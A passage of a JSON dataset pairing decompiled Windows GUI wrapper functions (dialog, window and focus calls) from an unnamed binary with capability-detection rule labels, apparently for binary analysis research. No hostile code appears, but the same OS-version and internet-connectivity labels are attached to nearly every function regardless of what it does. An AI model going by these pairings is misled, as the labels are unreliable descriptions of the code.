= fcn.0041c2bc(ppcVar4[1], arg_ch_00, arg_ch, arg_8h);\n                if (iVar1 != 0) break;\n                ppcVar4 = (**ppcVar4)();\n            }\n            iVar1 = fcn.00421cb4(in_ECX, arg_8h, arg_ch, *(iVar1 + 0x14), arg_10h, *(iVar1 + 0x10), arg_14h);\n            return iVar1;\n        }\n        arg_ch = 0;\n        if (arg_10h != 0) {\n            iVar1 = *(arg_10h + 0x30);\n            puVar2 = (**(*in_ECX + 0x2c))();\n            do {\n                if (puVar2 == NULL) {\n                    return arg_ch;\n                }\n                if (arg_ch != 0) {\n                    return arg_ch;\n                }\n                piVar5 = puVar2[1];\n                while (((piVar5[1] != 0 && (piVar5[2] != 0)) && (arg_ch == 0))) {\n                    if (arg_8h == piVar5[1]) {\n                        if (iVar1 == 0) {\n                            if (*piVar5 == 0) {\ncode_r0x00421e87:\n                                *(arg_10h + 4) = piVar5[2];\n                                arg_ch = 1;\n                            }\n                        }\n                        else if ((*piVar5 != 0) && (iVar3 = fcn.00421c9c(iVar1, *piVar5),  iVar3 != 0))\n                        goto code_r0x00421e87;\n                    }\n                    piVar5 = piVar5 + 3;\n                }\n                puVar2 = *puVar2;\n            } while( true );\n        }\n    }\n    fcn.0041901a();\ncode_r0x00421e0a:\n    iVar1 = fcn.0042b7b9();\n    iVar1 = (**(**(iVar1 + 0x3c) + 4))();\n    return iVar1;\n}\n",
        "token_count": 757
    },
    "004223dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004223dc(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x4c) != 0) {\n    // WARNING: Could not recover jumptable at 0x004223e7. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x4c) + 0x98))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "004223f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004223f2(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x4c) != 0) {\n    // WARNING: Could not recover jumptable at 0x004223fd. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x4c) + 0x54))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "00422427": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422427(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_CheckRadioButton)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042244c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x6c))();\n    return;\n}\n",
        "token_count": 153
    },
    "0042244f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042244f(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x20), param_2);\n        fcn.0041e67e(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00422470. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x74))();\n    return;\n}\n",
        "token_count": 155
    },
    "00422473": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00422473(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *unaff_retaddr;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x20), param_2);\n        *unaff_retaddr = uVar1;\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00422494. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x70))();\n    return;\n}\n",
        "token_count": 160
    },
    "00422497": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422497(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgItemInt)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004224bc. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x78))();\n    return;\n}\n",
        "token_count": 152
    },
    "004224bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004224bf(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgItemTextA)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004224e4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x7c))();\n    return;\n}\n",
        "token_count": 155
    },
    "004224e7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004224e7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_SendDlgItemMessageA)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h, arg_14h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042250f. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x80))();\n    return;\n}\n",
        "token_count": 166
    },
    "00422515": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422515(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_SetDlgItemInt)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042253a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x84))();\n    return;\n}\n",
        "token_count": 153
    },
    "004225b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004225b8(int32_t param_1)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x20), 0xfffffff0);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004225cf. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0x78))();\n    return;\n}\n",
        "token_count": 127
    },
    "004225d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004225d2(int32_t param_1)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x20), 0xffffffec);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004225e9. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0x7c))();\n    return;\n}\n",
        "token_count": 128
    },
    "004225ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004225ec(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        fcn.0041c16e(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00422610. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x50) + 0x80))();\n    return;\n}\n",
        "token_count": 147
    },
    "00422616": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422616(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        fcn.0041c188(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042263a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x50) + 0x84))();\n    return;\n}\n",
        "token_count": 147
    },
    "00422640": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00422640(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 != 0) goto code_r0x0042264c;\n    while( true ) {\n        fcn.0041901a();\ncode_r0x0042264c:\n        iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x20));\n        if (iVar1 != 0) break;\n        if (*(param_1 + 0x50) != 0) {\ncode_r0x0042265e:\n    // WARNING: Could not recover jumptable at 0x00422664. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(**(param_1 + 0x50) + 0x88))();\n            return;\n        }\n    }\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_SetWindowTextA)(*(param_1 + 0x20), param_2);\n        return;\n    }\n    goto code_r0x0042265e;\n}\n",
        "token_count": 257
    },
    "00422681": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422681(int32_t param_1)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_1 + 0x20));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00422696. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0x90))();\n    return;\n}\n",
        "token_count": 120
    },
    "004226bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004226bf(uint X, uint Y, uint nWidth, uint nHeight, uint bRepaint)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_MoveWindow)(*(in_ECX + 0x20), X, Y, nWidth, nHeight, bRepaint);\n    }\n    else {\n        (**(**(in_ECX + 0x50) + 0x98))(X, Y, nWidth, nHeight);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004226fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004226fd(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(*(param_1 + 0x20), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00422718. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0xa0))();\n    return;\n}\n",
        "token_count": 128
    },
    "0042271e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042271e(int32_t param_1)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_IsWindowEnabled)(*(param_1 + 0x20));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00422733. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0xa4))();\n    return;\n}\n",
        "token_count": 120
    },
    "00422739": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00422739(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(*(param_1 + 0x20), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00422754. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0xa8))();\n    return;\n}\n",
        "token_count": 128
    },
    "0042275a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042275a(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x50) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_SetFocus)(*(param_1 + 0x20));\n        fcn.0041e67e(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00422775. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0xb0))();\n    return;\n}\n",
        "token_count": 143
    },
    "0042281e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042281e(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    if ((*(param_1 + 0x50) == 0) && (*(param_2 + 0x4c) != 0)) {\n        (**(**(param_2 + 0x4c) + 0x9c))(param_1, param_3);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "00422843": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422843(uint *param_1)\n\n{\n    if (param_1[1] != 0) {\n    // WARNING: Could not recover jumptable at 0x0042284e. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*param_1[1] + 0x78))();\n        return;\n    }\n    (*_sym.imp.USER32.dll_GetWindowLongA)(*param_1, 0xfffffff0);\n    return;\n}\n",
        "token_count": 113
    },
    "00422a19": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422a19(int32_t arg_8h, uint X, uint Y, uint cx, uint cy, uint uFlags)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        if (arg_8h != 0) {\n            arg_8h = *(arg_8h + 0x20);\n        }\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(in_ECX + 0x20), arg_8h, X, Y, cx, cy, uFlags);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00422a4f. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x50) + 0x9c))();\n    return;\n}\n",
        "token_count": 196
    },
    "00422a55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422a55(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((param_1 != 0) && (*(param_1 + 0x50) == 0)) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x20));\n        iVar2 = fcn.0043179d(uVar1);\n        if ((iVar2 != 0) && (*(iVar2 + 0x4c) != 0)) {\n            (**(**(iVar2 + 0x4c) + 0x9c))(param_1, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "00422b32": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00422b32(int32_t *arg_8h, code *arg_ch)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t **ppiVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t in_ECX;\n    bool bVar9;\n    uint uVar10;\n    code *var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetWindow;\n    if (*(in_ECX + 0x4c) == 0) {\n        piVar3 = NULL;\n    }\n    else {\n        if ((*(in_ECX + 0x3c) & 0x800) == 0) {\n            uVar10 = 5;\n            uVar4 = *(in_ECX + 0x20);\n            while( true ) {\n                uVar4 = (*pcVar2)(uVar4, uVar10);\n                iVar5 = fcn.0041e67e(uVar4);\n                if (iVar5 == 0) break;\n                uVar8 = fcn.004225d2();\n                if ((((uVar8 & 0x10000) != 0) && (uVar8 = fcn.004225b8(),  (uVar8 & 0x10000000) != 0)) &&\n                   (uVar8 = fcn.004225b8(),  (uVar8 & 0x8000000) == 0)) goto code_r0x00422c27;\n                uVar4 = *(iVar5 + 0x20);\n                uVar10 = 2;\n            }\n        }\n        if (arg_ch == NULL) {\n            var_8h = 0x41c937;\n            arg_ch = 0x41c748;\n        }\n        else {\n            var_8h = 0x422aff;\n            arg_ch = 0x42294d;\n        }\n        var_4h = (*arg_ch)();\njoined_r0x00422bd2:\n        do {\n            if (var_4h == 0) goto code_r0x00422c27;\n            ppiVar6 = (*var_8h)(&var_4h);\n            piVar1 = *ppiVar6;\n            if (arg_8h == NULL) {\n                if (piVar1[1] == 0) {\n                    iVar5 = *piVar1;\n                }\n                else {\n                    iVar5 = *(piVar1[1] + 0x24);\n                }\n                if ((iVar5 != 0) && (iVar7 = (*_sym.imp.USER32.dll_GetFocus)(),  iVar5 == iVar7)) break;\n                if (piVar1[1] == 0) goto joined_r0x00422bd2;\n                bVar9 = piVar1[1] == *(*(in_ECX + 0x4c) + 0x70);\n            }\n            else {\n                bVar9 = arg_8h == piVar1;\n            }\n        } while (!bVar9);\n        if (piVar1 == NULL) {\ncode_r0x00422c27:\n            piVar3 = NULL;\n        }\n        else {\n            do {\n                if (var_4h == 0) {\n                    var_4h = (*arg_ch)();\n                }\n                ppiVar6 = (*var_8h)(&var_4h);\n                piVar3 = *ppiVar6;\n                uVar8 = fcn.00422843();\n            } while ((piVar3 != piVar1) &&\n                    ((((uVar8 & 0x10000) == 0 || ((uVar8 & 0x8000000) != 0)) || ((uVar8 & 0x10000000) == 0))));\n        }\n    }\n    return piVar3;\n}\n",
        "token_count": 880
    },
    "00422c89": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422c89(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uint *puVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*(in_ECX + 0x4c) == 0) {\n        return;\n    }\n    if (arg_8h == NULL) {\n        return;\n    }\n    if ((arg_8h[2] == 0) ||\n       (iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*arg_8h, 0xf0, 0, 0),  puVar4 = arg_8h,  iVar2 != 1)) {\n        puVar3 = fcn.0043242b(arg_8h, 0);\n        puVar6 = &arg_8h;\n        arg_8h = puVar3;\n        fcn.0041c771(puVar6);\n        do {\n            if (arg_8h == NULL) {\ncode_r0x00422d2e:\n                arg_8h = puVar3;\n                fcn.0042296a(&arg_8h, puVar6);\n                while( true ) {\n                    if (arg_8h == NULL) {\n                        return;\n                    }\n                    puVar4 = fcn.0042296a(&arg_8h);\n                    puVar4 = *puVar4;\n                    if ((puVar4[2] != 0) && (iVar2 = (*pcVar1)(*puVar4, 0xf0, 0, 0),  iVar2 == 1)) break;\n                    uVar5 = fcn.00422843();\n                    if ((uVar5 & 0x20000) != 0) {\n                        return;\n                    }\n                }\n                break;\n            }\n            puVar6 = &arg_8h;\n            puVar4 = fcn.0041c771();\n            puVar4 = *puVar4;\n            uVar5 = fcn.00422843();\n            if ((uVar5 & 0x20000) != 0) goto code_r0x00422d2e;\n        } while ((puVar4[2] == 0) || (iVar2 = (*pcVar1)(*puVar4, 0xf0, 0, 0),  iVar2 != 1));\n    }\n    (*pcVar1)(*puVar4, 0xf1, 0, 0);\n    return;\n}\n",
        "token_count": 596
    },
    "00422dbb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00422dbb(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    fcn.00422901(param_1);\n    iVar1 = param_2;\n    while ((0 < iVar1 && (*(param_1 + 4) != 0))) {\n        if (*(param_2 + 4) != 0) {\n            fcn.00422951(param_2 + 4);\n        }\n        iVar1 = iVar1 + -1;\n    }\n    return param_2;\n}\n",
        "token_count": 127
    },
    "00422e15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00422e15(uint lpString, uint nMaxCount)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    if (*(extraout_ECX + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowTextA)(*(extraout_ECX + 0x20), *(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    }\n    else {\n        uVar2 = fcn.00423280();\n        fcn.00401680(uVar2);\n        iVar1 = **(extraout_ECX + 0x50);\n        *(unaff_EBP + -4) = 0;\n        (**(iVar1 + 0x8c))(unaff_EBP + -0x10);\n        fcn.00417b55(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x10), 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n        fcn.004010d0();\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 339
    },
    "00423187": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00423187(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_ECX + 0x4c) != 0) {\n        if (arg_8h == 0) {\n            iVar1 = fcn.0042301f();\n        }\n        else {\n            iVar1 = fcn.00422fd6(arg_8h);\n        }\n        if ((iVar1 != 0) && (fcn.0042310c(),  iVar1 != 0)) {\n            return *(iVar1 + 8);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 159
    },
    "004231d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004231d5(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_ECX + 0x4c) != 0) {\n        if (arg_8h == 0) {\n            iVar1 = fcn.0042301f();\n        }\n        else {\n            iVar1 = fcn.00422fd6(arg_8h);\n        }\n        if ((iVar1 != 0) && (fcn.00423091(),  iVar1 != 0)) {\n            return *(iVar1 + 8);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 159
    },
    "0042353c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
